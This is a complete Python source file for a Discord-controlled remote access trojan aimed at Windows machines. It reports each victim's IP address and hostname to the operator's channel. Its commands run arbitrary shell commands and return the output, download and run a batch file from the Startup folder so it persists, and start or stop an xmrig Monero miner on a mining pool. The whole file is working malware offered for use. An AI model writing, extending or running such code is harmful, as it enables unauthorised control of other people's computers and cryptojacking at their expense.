from discord.ext import commands
from discord import app_commands
from urllib import request
import multiprocessing
import requests
import discord
import psutil
import socket
import sys
import os

token = '' # Token
channel_id =  # Channel ID 

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get('https://api.ipify.org').text.strip()
hostname = socket.gethostname()
total_cpu = multiprocessing.cpu_count()
hcpu = int(total_cpu / 2)
appdata = os.getenv("AppData")
startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
temp = os.getenv('temp')
os.chdir(temp)

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f'{bot.user}')
    await channel.send(f"``[+] {ip}@{hostname}: Session opened``")


# ----- Bot Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {ip}@{hostname}``")

# exit
@bot.command()
async def exit(ctx):
    await ctx.send(f"``[-] {ip}@{hostname}: Session closed``")
    sys.exit()

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")

# check
@bot.command()
async def check(ctx):
    if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")

# update rat
@bot.command()
async def update(ctx):
    if os.path.exists(f"{startup}\main.bat"):
        os.popen(f'"{startup}"\main.bat')
        await ctx.send(f"``[+] {ip}@{hostname}: Bot updated``")
        sys.exit()
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Bot not updated``")

# windows script update
@bot.command(name='winsc-update')
async def winsc(ctx, arg1):
    link = ''.join(arg1)
    os.chdir(startup)
    
    url = link
    r = requests.get(url, allow_redirects=True)
    open("main.bat", 'wb').write(r.content)
    
    if os.path.exists("main.bat"):
        os.popen("main.bat")
        await ctx.send(f"``[+] {ip}@{hostname}: Script updated``")
        sys.exit()
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Script not updated``")
        os.chdir(temp)

# miner
@bot.command()
async def miner(ctx, arg1):
    wallet = ''.join(arg1)
    os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
    await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
        os.popen("taskkill /F /IM xmrig.exe /T")
        await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")


bot.run(token)